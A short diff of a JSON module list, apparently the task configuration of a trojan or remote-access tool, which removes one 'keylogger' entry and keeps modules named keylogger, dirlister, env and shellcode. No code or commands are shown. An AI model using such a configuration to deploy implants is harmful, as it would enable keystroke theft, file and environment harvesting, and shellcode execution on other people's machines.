@@ -4,6 +4,5 @@
 	{"pmod":"keylogger"},
 	{"module":"dirlister"},
 	{"module":"env"},
-	{"module":"keylogger"},
 	{"module":"shellcode"}
 ]
